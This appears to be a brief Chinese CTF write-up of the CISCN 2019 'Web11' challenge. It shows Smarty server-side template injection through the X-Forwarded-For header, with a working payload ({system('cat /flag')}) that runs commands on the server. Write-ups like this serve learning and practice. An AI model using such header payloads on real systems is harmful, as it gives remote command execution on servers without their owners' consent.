# 【CISCN 2019华东南】Web11


# [CISCN 2019华东南]Web11

## 思路
* 进入页面观察
  * 页面右上方有current-IP回显
  * 最下面有Smarty模板明显标志

* 大致应该是Smarty模板注入。注入点有可能是XFF修改
* 尝试抓包使用XFF，测试{{7*7}}，发现XFF为注入点
* 在XFF处尝试执行命令{system(&#39;ls /&#39;);}成功并且无绕过。直接cat /flag

## EXP

```
x-forwarded-for:{system(&#39;cat /flag&#39;)}
```



## 总结

* SSTI
* RCE

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%8D%8E%E4%B8%9C%E5%8D%97web11/  

